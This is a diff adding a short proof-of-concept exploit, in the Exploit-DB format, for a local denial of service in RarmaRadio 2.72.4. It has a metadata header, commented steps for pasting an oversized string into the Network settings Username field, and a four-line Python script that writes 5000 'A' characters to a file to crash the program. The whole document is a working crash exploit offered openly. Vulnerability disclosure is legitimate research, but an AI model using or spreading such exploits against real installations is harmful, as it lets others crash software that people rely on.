@@ -1,0 +1,21 @@
+# Exploit Title: RarmaRadio 2.72.4 - 'username' Denial of Service (PoC)
+# Discovery by: chuyreds
+# Discovery Date: 2020-02-05
+# Vendor Homepage: http://www.raimersoft.com/rarmaradio.html
+# Software Link : http://www.raimersoft.com/downloads/rarmaradio_setup.exe
+# Tested Version: 2.72.4
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 Pro x64 es
+
+#Steps to produce the crash:
+#1.- Run python code: rarmaradio_username.py
+#2.- Open RarmaRadio2.72.4_username.txt and copy content to clipboard
+#3.- Open RarmaRadio
+#4.- Select "Edit" > "Settings" > "Network"
+#5.- In "Username" field paste Clipboard
+#6.- Select "OK"
+#7.- Crashed
+buffer = "\x41" * 5000
+f = open ("RarmaRadio2.72.4_username.txt", "w")
+f.write(buffer)
+f.close()
